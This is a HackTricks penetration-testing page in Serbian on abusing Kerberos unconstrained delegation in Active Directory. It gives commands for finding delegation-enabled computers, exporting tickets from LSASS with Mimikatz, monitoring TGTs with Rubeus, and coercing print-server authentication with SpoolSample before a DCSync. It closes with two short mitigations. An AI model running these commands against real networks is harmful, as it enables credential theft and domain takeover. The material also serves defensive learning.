# Unconstrained Delegation

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Neograničeno preusmeravanje

Ovo je funkcija koju **Administrator domena** može postaviti na bilo koji **računar** unutar domena. Zatim, svaki put kada se **korisnik prijavi** na računar, **kopija TGT-a** tog korisnika će biti **poslata unutar TGS-a** koji pruža DC **i sačuvana u memoriji u LSASS-u**. Dakle, ako imate administratorske privilegije na mašini, moći ćete **izvući tikete i preuzeti identitet korisnika** na bilo kojoj mašini.

Dakle, ako se administrator domena prijavi na računar sa aktiviranom funkcijom "Neograničeno preusmeravanje", i vi imate lokalne administratorske privilegije na toj mašini, moći ćete izvući tiket i preuzeti identitet Administratora domena bilo gde (privilegije domene).

Možete **pronaći objekte računara sa ovim atributom** proveravajući da li atribut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) sadrži [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). To možete uraditi sa LDAP filterom ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što je ono što powerview radi:

<pre class="language-bash"><code class="lang-bash"># Lista računara sa neograničenim preusmeravanjem
## Powerview
Get-NetComputer -Unconstrained #DC-ovi uvek se pojavljuju ali nisu korisni za privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Izvoz tiketa sa Mimikatz-om
</strong>privilege::debug
sekurlsa::tickets /export #Preporučeni način
kerberos::list /export #Još jedan način

# Prati prijave i izvozi nove tikete
.\Rubeus.exe monitor /targetuser:&#x3C;korisničko_ime> /interval:10 #Proveri svakih 10s za nove TGT-ove
</code></pre>

Učitajte tiket Administratora (ili žrtvenog korisnika) u memoriju sa **Mimikatz**-om ili **Rubeus-om za** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Više informacija o neograničenom preusmeravanju na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Prisilna autentifikacija**

Ako napadač uspe da **kompromituje računar koji je dozvoljen za "Neograničeno preusmeravanje"**, on može **prevariti** server za **štampu** da se **automatski prijavi** na njega **čime se čuva TGT** u memoriji servera.\
Zatim, napadač može izvršiti napad **Pass the Ticket da bi preuzeo identitet** korisnika naloga računara za štampu.

Da biste naterali server za štampu da se prijavi na bilo koju mašinu, možete koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Ako je TGT sa kontrolera domena, možete izvesti napad [**DCSync**](acl-persistence-abuse/#dcsync) i dobiti sve hešove sa kontrolera domena.\
[**Više informacija o ovom napadu na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Evo drugih načina da pokušate izazvati autentifikaciju:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigacija

* Ograničite DA/Admin prijave na određene servise
* Postavite "Account is sensitive and cannot be delegated" za privilegovane naloge.

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Radite li u **cybersecurity kompaniji**? Želite li videti **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
